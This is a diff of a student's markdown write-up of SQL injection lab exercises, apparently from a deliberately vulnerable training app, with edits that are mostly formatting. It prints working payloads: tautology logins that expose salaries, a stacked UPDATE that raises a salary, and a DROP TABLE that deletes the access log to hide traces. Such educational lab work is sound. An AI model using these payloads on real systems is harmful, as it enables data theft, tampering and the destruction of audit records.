@@ -52,33 +52,40 @@ GRANT ALTER TABLE TO 'UnauthorizedUser';
 
 ### 10  
 
-Could not parse: 0 OR 1=1 to a number  
+`Could not parse: 0 OR 1=1 to a number`  
 This returned after trying to pass NaN values to Login_Count. This one might be protected.  
 
 Afterwards tried the values:  
+```
 Login_Count = 0  
 userid = 0 OR 1=1  
-
+```
+  
 Success.  
 <img src="../../../Homework/Pictures/SQLInj10Success.png" width="50%">  
 
 ### 11 Confidentiality (Get access to salaries)
   
-This was a trial and error run again for me.  
+This was a trial and error run for me.  
 At first I just looked into what my, John Smith's, data looks like.  
 Then I had some trouble with the syntax. How to place the quotation marks in the injected code.  
 Tried with input:  
+```
 Name: Smith' OR 'i'='i'  
 TAN: 3SL99A  
+```
 This resulted in a failure "malformed string". So I decided to take closer look at the original query:  
-"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';  
+`"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';`
+  
 Placing my little piece here it would look like:  
-"SELECT * FROM employees WHERE last_name = 'Smith' OR 'i'='i'' AND auth_tan = '3SL99A';  
+`"SELECT * FROM employees WHERE last_name = 'Smith' OR 'i'='i'' AND auth_tan = '3SL99A';`  
 The issue can be clearly seen in the extra quotation mark after the second 'i'. Even if fixed, the auth_tan would ruin my attempt so a revised version:  
+```
 Input: Smith' OR 'i'='i  
 TAN: 3SL99A' OR 'i'='i  
+```
 The full query is:  
-"SELECT * FROM employees WHERE last_name = 'Smith' OR 'i'='i' AND auth_tan = '3SL99A' OR 'i'='i';  
+`"SELECT * FROM employees WHERE last_name = 'Smith' OR 'i'='i' AND auth_tan = '3SL99A' OR 'i'='i';`  
   
 This one was a **success** as both test are always true but I did leave some traces of my actions as I used my actual name and TAN number with the injections. I could have input any random strings to be safe. Too late now.  
   
@@ -90,14 +97,16 @@ USERID	FIRST_NAME	LAST_NAME	DEPARTMENT	SALARY	AUTH_TAN
 This one was a pretty straight forward after understanding the syntax in the previous.  
 As we need to change some data in the database I will use the UPDATE and SET commands to achieve my goals.  
 So the original query again:  
-"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';  
+`"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';`  
   
 Input  
+```
 Name: Fairy  
 TAN: Godmother'; UPDATE employees SET salary=99000 WHERE auth_tan='3SL99A  
-  
+```
+
 The query being sent to the server would look like this:  
-SELECT * FROM employees WHERE last_name = 'Fairy' AND auth_tan = 'Godmother'; UPDATE employees SET salary=99000 WHERE auth_tan='3SL99A'  
+`SELECT * FROM employees WHERE last_name = 'Fairy' AND auth_tan = 'Godmother'; UPDATE employees SET salary=99000 WHERE auth_tan='3SL99A'`  
   
 A big payraise for John Smith **succesful**.  
 
@@ -108,17 +117,17 @@ So the goal is to wipe out the access_log table.
 I'm going to assume this will achieved by using DROP TABLE access_log.  
 Once again, first I just wanted to test the form so I just clicked search and was met with a record of my illegal actions. Not cool.  
 The SQL query is probably something like this:  
-SELECT * FROM access_log WHERE action = '" + action + "';
+`SELECT * FROM access_log WHERE action = '" + action + "';`
 
 So let's see:  
-Action contains: test'; DROP TABLE access_log  
+Action contains: `test'; DROP TABLE access_log`  
 So the query would be:  
-SELECT * FROM access_log WHERE action = 'test'; DROP TABLE access_log ';    
+`SELECT * FROM access_log WHERE action = 'test'; DROP TABLE access_log ';`    
 Did not really think this would work and it didn't but wanted to see what happens for educational purposes. 
 We seem to have a trailing quotation mark in the SQL query sent to the server.  
 
 Let's comment the quote out:  
-Action contains: '; DROP TABLE access_log --  
-SELECT * FROM access_log WHERE action = ''; DROP TABLE access_log -- ''
+Action contains: `'; DROP TABLE access_log --`  
+`SELECT * FROM access_log WHERE action = ''; DROP TABLE access_log -- ''`
 
 We have **succesfully** covered our trail.  
